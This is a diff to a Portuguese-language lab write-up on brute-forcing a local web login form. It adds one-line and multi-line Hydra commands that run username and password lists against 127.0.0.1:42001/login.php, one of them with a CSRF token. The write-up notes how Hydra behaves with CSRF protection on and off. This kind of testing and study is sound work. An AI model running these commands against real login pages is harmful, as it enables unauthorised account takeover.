@@ -579,11 +579,16 @@ hydra -L username.txt -P passwords.txt 127.0.0.1 http-post-form \
 
 ### Testes com Múltiplos Usuários
 
-**Comando com Lista de Usuários:**
+**Comandos Hydra com Lista de Usuários:**
 ```bash
 hydra -L usernames.txt -P passwords.txt 127.0.0.1 http-post-form \
   "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" \
   -vV -s 42001
+```
+
+```bash
+#Comando em uma linha
+hydra -L usernames.txt -P passwords.txt 127.0.0.1 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -vV -s 42001
 ```
 
 **Resultado:**
@@ -617,8 +622,7 @@ medusa -h 127.0.0.1 -U usernames.txt -P passwords.txt -M web-form \
 **Hydra com CSRF Ativo:**
 ```bash
 # Comando executado
-hydra -l admin -P passwords.txt 127.0.0.1 http-post-form \
-  "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -vV -s 42001
+hydra -L usernames.txt -P passwords.txt 127.0.0.1 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login&user_token=ccdd7f329362a78cc6bed4122bf0b5e5:F=Login failed" -vV -s 42001
 
 # Comportamento observado
 - Segue redirecionamentos
@@ -640,6 +644,9 @@ hydra -l admin -P passwords.txt 127.0.0.1 http-post-form \
 
 **Hydra com CSRF Desativado:**
 ```bash
+# Comando executado
+hydra -L usernames.txt -P passwords.txt 127.0.0.1 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -vV -s 42001
+
 # Comportamento radicalmente diferente
 - Segue redirecionamentos normalmente
 - Detecta corretamente sucesso/falha
